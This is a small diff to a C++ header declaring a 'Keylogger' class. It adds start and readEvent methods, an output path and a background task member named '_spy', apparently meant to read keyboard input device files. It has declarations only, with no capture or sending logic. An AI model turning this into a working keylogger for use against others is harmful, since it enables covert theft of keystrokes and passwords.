@@ -3,6 +3,7 @@
 
 #include <string>
 #include <vector>
+#include <future>
 
 namespace kl
 {
@@ -11,13 +12,19 @@ namespace kl
     {
     public:
         Keylogger(std::string output, bool debug, std::vector<std::string> inputDir);
-        virtual ~Keylogger() = default;
+        virtual ~Keylogger();
+
+        void start();
+        void readEvent();
+
     private:
         void _findInputFile(const std::vector<std::string> &);
+
     private:
-        std::string _output;
+        std::string _outputPath;
         bool _debug;
         std::string _input;
+        std::future<void> _spy;
     };
 }
 
